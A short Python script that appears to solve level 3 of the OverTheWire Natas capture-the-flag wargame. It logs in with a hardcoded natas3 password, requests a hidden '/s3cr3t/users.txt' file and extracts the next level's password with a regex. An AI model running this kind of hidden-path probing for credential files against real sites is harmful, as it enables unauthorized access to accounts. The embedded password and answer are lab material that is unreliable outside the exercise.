import requests
import re

username = 'natas3'
password = 'sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14'

url = f'http://{username}.natas.labs.overthewire.org/s3cr3t/users.txt'

response = requests.get(url, auth=(username, password))
content = response.text

print(re.findall('natas4:(.*)', content)[0])